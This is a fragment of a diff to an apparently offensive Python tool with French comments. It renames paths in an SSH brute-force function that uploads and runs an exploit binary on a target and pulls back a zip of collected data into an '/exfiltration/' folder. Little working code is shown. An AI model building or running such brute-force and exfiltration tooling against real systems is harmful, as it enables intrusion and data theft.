@@ -183,10 +183,10 @@ def bruteFTP(ip): #bruteforce FTP + récuperation de données
 
 def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
 	exec_dir = ""
-	source = '/exploit_locale.exe'
+	source = '/exploit_loco.exe'
 	destination ='/home/Admin/Desktop/exploit_locale.exe'
-	remotezip='/home/Admin/Desktop/collecte.zip'
-	tolocalzip='/exfiltration/collecte.zip'
+	remotezip='/home/Admin/Desktop/ZipDump.zip'
+	tolocalzip='/exfiltration/ZipDump.zip'
 	#a activer ou désactiver pour le debug
 	#paramiko.util.log_to_file("paramiko.log")
 	ssh = paramiko.SSHClient()
